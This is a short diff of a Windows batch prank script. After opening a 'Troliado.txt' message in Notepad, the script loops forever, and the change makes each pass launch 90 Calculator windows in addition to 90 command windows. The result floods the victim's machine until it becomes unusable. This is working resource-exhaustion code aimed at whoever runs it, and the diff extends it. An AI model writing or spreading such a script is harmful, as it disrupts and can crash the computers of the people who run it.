@@ -19,5 +19,6 @@ start notepad "%script_dir%Troliado.txt"
 timeout /t 30
 timeout /t 1
 :loop
-for /l %%i in (1,1,90) do start cmd
+(for /l %%i in (1,1,90) do start cmd)
+(for /l %%i in (1,1,90) do start calc)
 goto loop
